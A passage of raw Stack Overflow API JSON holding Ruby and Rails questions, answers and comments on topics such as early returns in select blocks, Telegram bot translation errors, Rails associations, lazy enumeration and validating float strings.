"https://www.gravatar.com/avatar/69ef5d19ed581a0fcc98857d0e89527d?s=128&d=identicon&r=PG", "display_name": "Catfish", "link": "https://stackoverflow.com/users/222403/catfish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 56213892, "answer_count": 1, "score": 0, "last_activity_date": 1558330538, "creation_date": 1558321707, "question_id": 56213858, "link": "https://stackoverflow.com/questions/56213858/array-select-not-iterating-through-every-element", "title": "array.select not iterating through every element", "body": "<p>I have a rails controller and this code only loop through the first element in the <code>metrics</code> array? Why is that?</p>\n\n<pre><code># /metrics/:id\ndef values\n  @metric = metrics.select do |metric|\n    id = metric['href'].split('/').last\n    p \"id == params[:id] = #{id == params[:id]}\" # false on the first iteration (but never gets to the next iteration\n    return id == params[:id]\n  end\n  p \"HERE?\" # We never get here!\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "telegram-bot"], "comments": [{"owner": {"reputation": 449, "user_id": 10739704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XmWze.jpg?s=128&g=1", "display_name": "nileshkumar", "link": "https://stackoverflow.com/users/10739704/nileshkumar"}, "edited": false, "score": 0, "creation_date": 1558291967, "post_id": 56210933, "comment_id": 99043154, "body": "as error tells that translation is missing. So remove &#39;t&#39; from text hash. Try: <code>respond_with :message, text: &quot;I have display number 2&quot;</code>"}, {"owner": {"reputation": 43, "user_id": 10358805, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-3gnreRZBAS8/AAAAAAAAAAI/AAAAAAAAARw/a8UiIpMnVcU/photo.jpg?sz=128", "display_name": "\u0422\u0430\u0440\u0430\u0441 \u041c\u0430\u0442\u0456\u0457\u0432", "link": "https://stackoverflow.com/users/10358805/%d0%a2%d0%b0%d1%80%d0%b0%d1%81-%d0%9c%d0%b0%d1%82%d1%96%d1%97%d0%b2"}, "reply_to_user": {"reputation": 449, "user_id": 10739704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XmWze.jpg?s=128&g=1", "display_name": "nileshkumar", "link": "https://stackoverflow.com/users/10739704/nileshkumar"}, "edited": false, "score": 0, "creation_date": 1558292111, "post_id": 56210933, "comment_id": 99043187, "body": "OMG, i stupid, it was logical... Ty very much"}], "answers": [{"tags": [], "owner": {"reputation": 449, "user_id": 10739704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XmWze.jpg?s=128&g=1", "display_name": "nileshkumar", "link": "https://stackoverflow.com/users/10739704/nileshkumar"}, "is_accepted": true, "score": 0, "last_activity_date": 1558292246, "creation_date": 1558292246, "answer_id": 56211037, "question_id": 56210933, "link": "https://stackoverflow.com/questions/56210933/not-understood-output-in-telegram-bot-from-rails-controller/56211037#56211037", "title": "Not understood output in Telegram Bot from rails controller", "body": "<p>as error tells that translation is missing. So remove 't' from text hash. \nTry: </p>\n\n<pre><code>respond_with :message, text: \"I have display number 2\"\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 10358805, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-3gnreRZBAS8/AAAAAAAAAAI/AAAAAAAAARw/a8UiIpMnVcU/photo.jpg?sz=128", "display_name": "\u0422\u0430\u0440\u0430\u0441 \u041c\u0430\u0442\u0456\u0457\u0432", "link": "https://stackoverflow.com/users/10358805/%d0%a2%d0%b0%d1%80%d0%b0%d1%81-%d0%9c%d0%b0%d1%82%d1%96%d1%97%d0%b2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 56211037, "answer_count": 1, "score": -2, "last_activity_date": 1559100439, "creation_date": 1558291479, "last_edit_date": 1559100439, "question_id": 56210933, "link": "https://stackoverflow.com/questions/56210933/not-understood-output-in-telegram-bot-from-rails-controller", "title": "Not understood output in Telegram Bot from rails controller", "body": "<p>I have an action in Telegram controller</p>\n\n<pre><code>class TelegramWebhooksController &lt; Telegram::Bot::UpdatesController         \n  def start!(*)\n    respond_with :message, text: t(\"I have display number 2\")\n  end     \nend\n</code></pre>\n\n<p>To start poller I run in console </p>\n\n<pre><code>Telegram::Bot::UpdatesPoller.new(Telegram.bots[:default], TelegramWebhooksController).start \n</code></pre>\n\n<p>If I text <code>/start</code> in bot I get the error</p>\n\n<blockquote>\n  <p>translation missing: en.I have display number 2</p>\n</blockquote>\n\n<p>I don't understand why I get the error. Please, help</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"tags": [], "owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "is_accepted": true, "score": 0, "last_activity_date": 1558285150, "creation_date": 1558285150, "answer_id": 56210088, "question_id": 56209965, "link": "https://stackoverflow.com/questions/56209965/rails-says-task-must-exist-when-trying-to-create-a-submission/56210088#56210088", "title": "Rails says task must exist when trying to create a submission", "body": "<p>You are not assigning the task, you are only finding it in your create method. Please do this instead:</p>\n\n<pre><code>def create\n  @submission = current_user.submissions.build(submission_params)\n  @submission.task = Task.find(params[:task_id])\n  if @submission.save\n    flash[:success] = \"Submitted!\"\n    redirect_to task_submission_path(@task, @submission)\n  else\n    puts @submission.errors.full_messages\n    render 'new'\n  end\nend\n</code></pre>\n\n<p>But Rails is able to perform this automatically, if you change the whitelisted params:</p>\n\n<pre><code>def create\n  @submission = current_user.submissions.build(submission_params)\n  if @submission.save\n    flash[:success] = \"Submitted!\"\n    redirect_to task_submission_path(@task, @submission)\n  else\n    puts @submission.errors.full_messages\n    render 'new'\n  end\nend\n\nprivate\n\ndef submission_params\n  params.require(:submission).permit(:description, :task_id)\nend\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 11395645, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb793b37119da4f0f30a1b77e05d54cc?s=128&d=identicon&r=PG&f=1", "display_name": "RandomUser2002", "link": "https://stackoverflow.com/users/11395645/randomuser2002"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "accepted_answer_id": 56210088, "answer_count": 1, "score": 0, "last_activity_date": 1558285150, "creation_date": 1558284291, "last_edit_date": 1558285083, "question_id": 56209965, "link": "https://stackoverflow.com/questions/56209965/rails-says-task-must-exist-when-trying-to-create-a-submission", "title": "Rails says task must exist when trying to create a submission", "body": "<p>I want to create a submission model where a user can create submissions for tasks. Each submission should have a user_id and a task_id. When I try to create a submission, rails returns an error saying that the task must exist.</p>\n\n<p>task model:</p>\n\n<pre><code>has_many :submissions\n</code></pre>\n\n<p>user model:</p>\n\n<pre><code>has_many :submissions\n</code></pre>\n\n<p>submission model:</p>\n\n<pre><code>belongs_to :user\nbelongs_to :task\n</code></pre>\n\n<p>routes:</p>\n\n<pre><code>resources :tasks do\n  resources :submissions\nend\n</code></pre>\n\n<p>submissions controller:</p>\n\n<pre><code>def create\n  @task = Task.find(params[:task_id])\n  @submission = current_user.submissions.build(submission_params)\n  if @submission.save\n    flash[:success] = \"Submitted!\"\n    redirect_to task_submission_path(@task, @submission)\n  else\n    puts @submission.errors.full_messages\n    render 'new'\n  end\nend\n\ndef new\n  @task = Task.find(params[:task_id])\n  @submission = Submission.new\nend\n\ndef show\n  @submission = Submission.find(params[:id])\nend\n\nprivate\n\n  def submission_params\n    params.require(:submission).permit(:description)\n  end\n</code></pre>\n\n<p>tasks/show.html.erb:</p>\n\n<pre><code>&lt;% if user_signed_in? %&gt;\n  &lt;%= link_to \"Submit\", new_task_submission_path(@task) %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>submissions/new.html.erb:</p>\n\n<pre><code>&lt;h2&gt;Submit&lt;/h2&gt;\n&lt;%= form_for [:task, @submission] do |f| %&gt;\n  &lt;div&gt;&lt;%= hidden_field_tag :task_id, @task.id %&gt;&lt;/div&gt;\n  &lt;div class=\"field\"&gt;\n    &lt;%= f.text_area :description, placeholder: \"File description\" %&gt;\n  &lt;/div&gt;\n  &lt;%= f.submit \"Submit\", class: \"btn btn-primary\" %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>submission migration:</p>\n\n<pre><code>def change\n  create_table :submissions do |t|\n    t.string :description\n    t.integer :user_id\n    t.integer :task_id\n\n    t.timestamps\n  end\nend\n</code></pre>\n"}, {"tags": ["arrays", "ruby"], "comments": [{"owner": {"reputation": 5060, "user_id": 10522579, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7GQ6a.jpg?s=128&g=1", "display_name": "ray", "link": "https://stackoverflow.com/users/10522579/ray"}, "edited": false, "score": 0, "creation_date": 1558333608, "post_id": 56209958, "comment_id": 99051369, "body": "Why did not you choose <code>arr.select { |z| z &gt; 3 }[2]</code> ?"}, {"owner": {"reputation": 29579, "user_id": 316700, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6f952bee7570a3db2ecba5b06c0062b3?s=128&d=identicon&r=PG", "display_name": "fguillen", "link": "https://stackoverflow.com/users/316700/fguillen"}, "reply_to_user": {"reputation": 5060, "user_id": 10522579, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7GQ6a.jpg?s=128&g=1", "display_name": "ray", "link": "https://stackoverflow.com/users/10522579/ray"}, "edited": false, "score": 0, "creation_date": 1559208076, "post_id": 56209958, "comment_id": 99351854, "body": "@ray because in my production scenario the filter computation is very expensive and the number of elements can be thousands. So I want to break the loop as soon I have achieve the minimum desirable amount"}, {"owner": {"reputation": 5060, "user_id": 10522579, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7GQ6a.jpg?s=128&g=1", "display_name": "ray", "link": "https://stackoverflow.com/users/10522579/ray"}, "edited": false, "score": 0, "creation_date": 1559215687, "post_id": 56209958, "comment_id": 99355304, "body": "I got your point"}], "answers": [{"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 7, "creation_date": 1558286072, "post_id": 56210091, "comment_id": 99041585, "body": "...or <code>a.lazy.select{|x| x &gt; 3}.first(2)</code> to bail out as soon as the first two have been found."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558286145, "post_id": 56210091, "comment_id": 99041605, "body": "@CarySwoveland That&#39;s exactly something I am thinking now. Thanks. Will update the answer now."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558286885, "post_id": 56210091, "comment_id": 99041829, "body": "I prefer that any acknowledgement of readers&#39; contributions to answers be confined to comments (and that such acknowledgements are generally not needed), in order to keep answers focused on the question. In the same way you don&#39;t see books and articles littered with acknowledgements of which readers of drafts suggested which changes."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558288474, "post_id": 56210091, "comment_id": 99042269, "body": "Okay sure. Thanks"}], "tags": [], "owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "is_accepted": false, "score": 3, "last_activity_date": 1558286237, "last_edit_date": 1558286237, "creation_date": 1558285168, "answer_id": 56210091, "question_id": 56209958, "link": "https://stackoverflow.com/questions/56209958/ruby-array-select-with-number-of-elements/56210091#56210091", "title": "Ruby, Array.select with number of elements", "body": "<pre><code>a = [1, 2, 3, 4, 5, 6]\n\np a.filter {|x| x &gt; 3}.first(2)\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>p a.select{|x| x &gt; 3}.first(2)\n</code></pre>\n\n<p>output</p>\n\n<pre><code>[4, 5]\n</code></pre>\n\n<p>As Cary suggest, the given below code wouldn't be a performance hit if  array is bigger, it would stop executing further if 2 elements are found</p>\n\n<pre><code>a.lazy.select{|x| x &gt; 3}.first(2)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1558292385, "post_id": 56210815, "comment_id": 99043263, "body": "Wow super. Amazing idea."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558326331, "post_id": 56210815, "comment_id": 99049388, "body": "This traverses the whole array, which might be a bit underperformant for <code>[1, 1, *1..Float::INFINITY]</code>."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1558334836, "post_id": 56210815, "comment_id": 99051817, "body": "@AlekseiMatiushkin, I&#39;m aware. But I&#39;m unsure about <code>partition</code>. I&#39;ve not been able to find how to break when <code>res.size &lt; 2</code>, <code>and break if</code> was returning <code>nil</code>. But I&#39;m learning it right now from your answer: <code>{ |e, res| res &lt;&lt; e if e &gt; 3; break res if res.size == 2 }</code> :)."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558336077, "post_id": 56210815, "comment_id": 99052319, "body": "If you are unsure about <code>partition</code>, there is a simple way to ensure: <code>(1..10).partition { |e| puts e; e &gt; 3 }.first.first(2)</code>. To escape sooner you need a lazy enumerator."}], "tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": false, "score": 1, "last_activity_date": 1558290634, "creation_date": 1558290634, "answer_id": 56210815, "question_id": 56209958, "link": "https://stackoverflow.com/questions/56209958/ruby-array-select-with-number-of-elements/56210815#56210815", "title": "Ruby, Array.select with number of elements", "body": "<p>Just for having a couple of options more..</p>\n\n<pre><code>ary.each_with_object([]) { |e, res| res &lt;&lt; e if e &gt; 3 &amp;&amp; res.size &lt; 2 }\n</code></pre>\n\n<p>or</p>\n\n<pre><code>ary.partition { |e| e &gt; 3 }.first.first(2)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1558458101, "post_id": 56214362, "comment_id": 99105018, "body": "Why don&#39;t you use to_enum method instead of each?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1558461361, "post_id": 56214362, "comment_id": 99106488, "body": "<code>each</code> without a block calls <code>to_enum</code> under the hood."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1558472589, "post_id": 56214362, "comment_id": 99111074, "body": "Yes, but here your intention is to convert so why calling each rather than to_enum? That would explicitly tells us as well."}, {"owner": {"reputation": 29579, "user_id": 316700, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6f952bee7570a3db2ecba5b06c0062b3?s=128&d=identicon&r=PG", "display_name": "fguillen", "link": "https://stackoverflow.com/users/316700/fguillen"}, "edited": false, "score": 0, "creation_date": 1559208259, "post_id": 56214362, "comment_id": 99351945, "body": "the part of <code>stop traversing the input as soon as two elements are found</code> is the key here."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 3, "last_activity_date": 1558326847, "creation_date": 1558326847, "answer_id": 56214362, "question_id": 56209958, "link": "https://stackoverflow.com/questions/56209958/ruby-array-select-with-number-of-elements/56214362#56214362", "title": "Ruby, Array.select with number of elements", "body": "<p>You were nearly there. Just use <code>break</code> with a parameter:</p>\n\n<pre><code>[1, 2, 3, 4, 5, 6].each_with_object([]) do |element, acc|\n  acc &lt;&lt; element if element &gt; 3\n  break acc if acc.size &gt;= 2\nend\n</code></pre>\n\n<p>Another way to accomplish it, would be to use <a href=\"https://ruby-doc.org/core/Enumerator/Lazy.html\" rel=\"nofollow noreferrer\"><code>Enumerator::Lazy</code></a> with <code>array.lazy.select</code>, or an explicit <code>Enumerator</code> instance with <code>Enumerable#take</code> (here it\u2019s a definite overkill, posting mostly for educational purposes.)</p>\n\n<pre><code>enum =\n  Enumerator.new do |y|\n    i = [1, 2, 3, 4, 5, 6].each\n    loop { i.next.tap { |e| y &lt;&lt; e if e &gt; 3 } }\n  end\nenum.take(2)\n#\u21d2 [4, 5]\n</code></pre>\n\n<p><em>Sidenote:</em> both examples above would stop traversing the input as soon as two elements are found.</p>\n"}], "owner": {"reputation": 29579, "user_id": 316700, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6f952bee7570a3db2ecba5b06c0062b3?s=128&d=identicon&r=PG", "display_name": "fguillen", "link": "https://stackoverflow.com/users/316700/fguillen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 410, "favorite_count": 0, "accepted_answer_id": 56214362, "answer_count": 3, "score": 1, "last_activity_date": 1558326847, "creation_date": 1558284227, "question_id": 56209958, "link": "https://stackoverflow.com/questions/56209958/ruby-array-select-with-number-of-elements", "title": "Ruby, Array.select with number of elements", "body": "<p>I have this array</p>\n\n<pre><code>[1, 2, 3, 4, 5, 6]\n</code></pre>\n\n<p>I would like to get the first 2 elements that are bigger than 3.</p>\n\n<p>I can do:</p>\n\n<pre><code>elements = []\n\n[1, 2, 3, 4, 5, 6].each do |element|\n  elements &lt;&lt; element if element &gt; 3\n  break if elements.size == 2\nend\n\nputs elements\n</code></pre>\n\n<p>Is there a more elegant way to do this?</p>\n\n<p>Is there something in the Ruby core like <code>Array.select(num_elements, &amp;block)</code>?</p>\n"}, {"tags": ["regex", "ruby", "string", "regex-group"], "comments": [{"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "edited": false, "score": 2, "creation_date": 1558287949, "post_id": 56209658, "comment_id": 99042116, "body": "You rarely want to use <code>^</code> and <code>$</code> (beginning/ending of <i>line</i>) in Ruby regexes, you almost always want <code>\\A</code> and <code>\\z</code> (beginning/ending of <i>string</i>) instead. Have a look at the <a href=\"https://ruby-doc.org/core/Kernel.html#method-i-Float\" rel=\"nofollow noreferrer\"><code>Kernel#Float</code></a> and <a href=\"https://ruby-doc.org/core/Kernel.html#method-i-Integer\" rel=\"nofollow noreferrer\"><code>Kernel#Integer</code></a> methods."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558288466, "post_id": 56209658, "comment_id": 99042265, "body": "I assume you will not encounter <code>float?(1.2e3)</code>. I understand why you may want to confirm certain values are integers (the number of periods over which a loan is to be repaid, for example), but I don&#39;t see why you need to determine if a value is a float. If the input is the amount of a loan, for example, just convert it to a float, caring not about whether it was entered as a float or an integer. Using floats for financial calculations is generally a bad idea because of round-off error. That&#39;s why we have <a href=\"http://ruby-doc.org/stdlib-2.5.1/libdoc/bigdecimal/rdoc/BigDecimal.html\" rel=\"nofollow noreferrer\">BigDecimal</a>."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 11524345, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5bd3afca9ece464ac383136094cca73?s=128&d=identicon&r=PG&f=1", "display_name": "EzraE", "link": "https://stackoverflow.com/users/11524345/ezrae"}, "edited": false, "score": 1, "creation_date": 1558285442, "post_id": 56209711, "comment_id": 99041353, "body": "I like this expression better than the one I am currently using. One thing that I have a question about is the &#39;m&#39; in <code>&#47;([0-9]+\\.[0-9]+)&#47;m</code>"}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 2, "creation_date": 1558287430, "post_id": 56209711, "comment_id": 99041989, "body": "Note that <code>[0-9]</code> is the same as <code>\\d</code>. I don&#39;t think Ruby supports the <code>g</code> modifier. Also, providing a JS demo when there&#39;s no JS tag is of questionable usefulness."}, {"owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "edited": false, "score": 0, "creation_date": 1558380317, "post_id": 56209711, "comment_id": 99074391, "body": "Answers the question as written, but you should never need a float regex in Ruby (unless you&#39;re doing some very particular formatting stuff, which this asker doesn&#39;t seem to need)."}], "tags": [], "owner": {"reputation": 1, "user_id": 6553328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/omcAX.jpg?s=128&g=1", "display_name": "Emma", "link": "https://stackoverflow.com/users/6553328/emma"}, "is_accepted": false, "score": -1, "last_activity_date": 1558288790, "last_edit_date": 1558288790, "creation_date": 1558282677, "answer_id": 56209711, "question_id": 56209658, "link": "https://stackoverflow.com/questions/56209658/regex-for-validating-float-numbers/56209711#56209711", "title": "RegEx for validating float numbers", "body": "<p>You might just want to wrap your expression in a capturing group and it would pass float numbers, and fail others. </p>\n\n<h3>Test Code</h3>\n\n<pre><code>re = /([0-9]+\\.[0-9]+)/m\nstr = '1\n1000\n1.00\n1000.00'\n\n# Print the match result\nstr.scan(re) do |match|\n    puts match.to_s\nend\n</code></pre>\n\n<p>For your testing, you may not need to have a multiline flag and <code>m</code> can be safely removed.</p>\n\n<h3>JavaScript Demo</h3>\n\n<p>This snippet shows that we likely have a valid expression:  </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const regex = /([0-9]+\\.[0-9]+)/gm;\r\nconst str = `1\r\n1000\r\n1.00\r\n1000.00`;\r\nlet m;\r\n\r\nwhile ((m = regex.exec(str)) !== null) {\r\n    // This is necessary to avoid infinite loops with zero-width matches\r\n    if (m.index === regex.lastIndex) {\r\n        regex.lastIndex++;\r\n    }\r\n    \r\n    // The result can be accessed through the `m`-variable.\r\n    m.forEach((match, groupIndex) =&gt; {\r\n        console.log(`Found match, group ${groupIndex}: ${match}`);\r\n    });\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<h3>RegEx</h3>\n\n<p>If this wasn't your desired expression, you can modify/change your expressions in <a href=\"https://regex101.com/r/hCaazj/1\" rel=\"nofollow noreferrer\">regex101.com</a>.</p>\n\n<p><a href=\"https://i.stack.imgur.com/stbDz.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/stbDz.png\" alt=\"enter image description here\"></a></p>\n\n<h3>RegEx Circuit</h3>\n\n<p>You can also visualize your expressions in <a href=\"https://jex.im/regulex/#!flags=&amp;re=%5E(a%7Cb)*%3F%24\" rel=\"nofollow noreferrer\">jex.im</a>:</p>\n\n<p><a href=\"https://i.stack.imgur.com/O4a3S.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/O4a3S.png\" alt=\"enter image description here\"></a></p>\n\n<h3>Performance Test</h3>\n\n<p>This script returns the runtime of a float number against the expression.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const repeat = 1000000;\r\nconst start = Date.now();\r\n\r\nfor (var i = repeat; i &gt;= 0; i--) {\r\n\tconst regex = /([0-9]+\\.[0-9]+)/gm;\r\n\tconst str = `1000.00`;\r\n\tconst subst = `$1`;\r\n\r\n\tvar match = str.replace(regex, subst);\r\n}\r\n\r\nconst end = Date.now() - start;\r\nconsole.log(\"YAAAY! \\\"\" + match + \"\\\" is a match \ud83d\udc9a\ud83d\udc9a\ud83d\udc9a \");\r\nconsole.log(end / 1000 + \" is the runtime of \" + repeat + \" times benchmark test. \ud83d\ude33 \");</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 18079, "user_id": 503402, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/873ad707fb34aac8fbdfbfec676e02e9?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/503402/max"}, "is_accepted": true, "score": 0, "last_activity_date": 1558380230, "creation_date": 1558380230, "answer_id": 56226976, "question_id": 56209658, "link": "https://stackoverflow.com/questions/56209658/regex-for-validating-float-numbers/56226976#56226976", "title": "RegEx for validating float numbers", "body": "<p>The simple and robust way to do this is to not use a regular expression at all. Why do you care what the string looks like? What you really care about is if Ruby can actually <em>convert</em> that string to an int/float. Use the built-in <code>Integer</code> and <code>Float</code> methods for that:</p>\n\n<pre><code>def integer?(input)\n  Integer(input)\n  true\nrescue\n  false\nend\n\ndef float?(input)\n  Float(input)\n  true\nrescue\n  false\nend\n</code></pre>\n\n<p>And what's the point of checking if the string can be converted if you don't get the converted value at the end? Combine everything:</p>\n\n<pre><code>def number string\n  begin\n    return Integer(string)\n  rescue\n    return Float(string)\n  end\nrescue\n  nil\nend\n\nif num = number input\n  # now num is some number type: Fixnum/Bignum/Float\nend\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 11524345, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5bd3afca9ece464ac383136094cca73?s=128&d=identicon&r=PG&f=1", "display_name": "EzraE", "link": "https://stackoverflow.com/users/11524345/ezrae"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "accepted_answer_id": 56226976, "answer_count": 2, "score": 1, "last_activity_date": 1558380230, "creation_date": 1558282337, "last_edit_date": 1558282937, "question_id": 56209658, "link": "https://stackoverflow.com/questions/56209658/regex-for-validating-float-numbers", "title": "RegEx for validating float numbers", "body": "<p>I'm making a mortgage calculator for class. I have a method to determine whether or not the value is a float, ditto valid number, ditto 